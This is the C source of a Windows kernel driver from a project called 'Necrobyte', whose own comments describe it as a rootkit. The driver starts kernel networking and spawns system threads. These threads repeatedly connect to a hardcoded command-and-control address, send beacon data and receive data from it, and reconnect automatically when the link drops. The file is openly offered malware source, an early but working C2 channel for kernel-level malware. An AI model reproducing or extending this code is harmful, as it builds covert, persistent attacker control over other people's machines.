/*++

Project Name:
    Necrobyte

Author:
    asel

Description:
    a

Last Commit:
    2024-05-18

--*/

// Includes

#include "include/Global.h"
#include "include/Nt.h"

#include "Memory/Memory.h"
#include "Memory/Map/Map.h"

#include "Socket/Socket.h"

// Variables & Macros

#define IP IP_ADDR(192, 168, 0, 106)
#define PORT 8080

HANDLE                          NeServiceNetworkThread;
HANDLE                          NeServicePacketLogThread;

BOOLEAN                         NeServiceRunningReady = FALSE;
WSK_APP_SOCKET_CONTEXT          NeSocketContext;

// Prototypes


NEOBJ NTSTATUS NTAPI    // Network Handler, makes sure that the rootkit is always trying to connect to the C2 server
NeServiceNetworkHandler(
    _In_ PVOID                  Context
);

NEOBJ NTSTATUS NTAPI    // Packet log, logs all the packets that are being sent and received
NeServicePacketLog(
    _In_ PVOID                  Context
);


// Entry point

NE NTSTATUS NTAPI
DriverEntry(
    _In_ PDRIVER_OBJECT         DriverObject,
    _In_ PUNICODE_STRING        RegistryPath
) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS                    Status;

    Status = WSKStartup(
        &WSKRegistration
    );

    if (NT_SUCCESS(Status) == FALSE)
        return Status;

    Status = PsCreateSystemThread(
        &NeServiceNetworkThread,
        (ACCESS_MASK)0,
        NULL,
        (HANDLE)0,
        NULL,
        NeServiceNetworkHandler,
        NULL
    );

    if (NT_SUCCESS(Status) == FALSE)
        return Status;

    return STATUS_SUCCESS;
}

NEOBJ NTSTATUS NTAPI
NeServiceNetworkHandler(
    _In_ PVOID                  Context
) {
    UNREFERENCED_PARAMETER(Context);

    NTSTATUS                    Status;

    Status = WSKSocket(
        &NeSocketContext,
        AF_INET,
        SOCK_STREAM,
        IPPROTO_TCP,
        WSK_FLAG_CONNECTION_SOCKET
    );

    if (NT_SUCCESS(Status) == FALSE)
        return Status;

    SOCKADDR_IN                 LocalAddress = { 0 };
    LocalAddress.sin_family      = AF_INET;
    LocalAddress.sin_port        = HTONS(PORT);
    LocalAddress.sin_addr.s_addr = INADDR_ANY;

    Status = WSKBindSocket(
        NeSocketContext.Socket,
        LocalAddress,
        0
    );

    if (NT_SUCCESS(Status) == FALSE)
        return Status;

    SOCKADDR_IN                 RemoteAddress = { 0 };
    RemoteAddress.sin_family     = AF_INET;
    RemoteAddress.sin_port       = HTONS(PORT);
    RemoteAddress.sin_addr.s_addr = IP;

    do {
        Status = WSKConnectSocket(
            NeSocketContext.Socket,
            RemoteAddress,
            0
        );

        if (NT_SUCCESS(Status) == FALSE)
            continue;

        if (NeServicePacketLogThread != NULL)
            ZwClose(NeServicePacketLogThread);

        Status = PsCreateSystemThread(
            &NeServicePacketLogThread,
            (ACCESS_MASK)0,
            NULL,
            (HANDLE)0,
            NULL,
            NeServicePacketLog,
            NULL
        );

        if (NT_SUCCESS(Status) == FALSE)
            return Status;

    } while (NT_SUCCESS(Status) == FALSE);

    return Status;
}

NEOBJ NTSTATUS NTAPI
NeServicePacketLog(
    _In_ PVOID                  Context
) {
    UNREFERENCED_PARAMETER(Context);

    NTSTATUS                    Status;

    WSK_BUF                     SendBuffer = { 0 };
    WSK_BUF                     RecvBuffer = { 0 };

    while (TRUE) {
        CHAR Message[256] = "Hello, World!\x0";

        SendBuffer.Length = sizeof(Message);
        SendBuffer.Offset = 0;
        SendBuffer.Mdl = IoAllocateMdl(
            Message,
            (ULONG)sizeof(Message),
            FALSE, FALSE,
            NULL
        );

        if (SendBuffer.Mdl == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;

        Status = WSKSendData(
            NeSocketContext.Socket,
            &SendBuffer,
            0
        );

        if (NT_SUCCESS(Status) == FALSE)
            return Status;

        CHAR Buffer[1024] = { 0 };
        RecvBuffer.Length = sizeof(Buffer);
        RecvBuffer.Offset = 0;
        RecvBuffer.Mdl = IoAllocateMdl(
            Buffer,
            (ULONG)sizeof(Buffer),
            FALSE, FALSE,
            NULL
        );

        if (RecvBuffer.Mdl == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;

        Status = WSKReceiveData(
            NeSocketContext.Socket,
            &RecvBuffer,
            0
        );

        if (NT_SUCCESS(Status) == FALSE) {
            if (Status != STATUS_CONNECTION_RESET)
                return Status;

            Status = WSKCloseSocket(
                NeSocketContext.Socket
            );

            if (NT_SUCCESS(Status) == FALSE)
                return Status;

            if (NeServiceNetworkThread != NULL)
                ZwClose(NeServiceNetworkThread);

            Status = PsCreateSystemThread(
                &NeServiceNetworkThread,
                (ACCESS_MASK)0,
                NULL,
                (HANDLE)0,
                NULL,
                NeServiceNetworkHandler,
                NULL
            );

            if (NT_SUCCESS(Status) == FALSE)
                return Status;

            break;
        }
        //Print("%s\xA", Buffer);
    }

    return STATUS_SUCCESS;
}
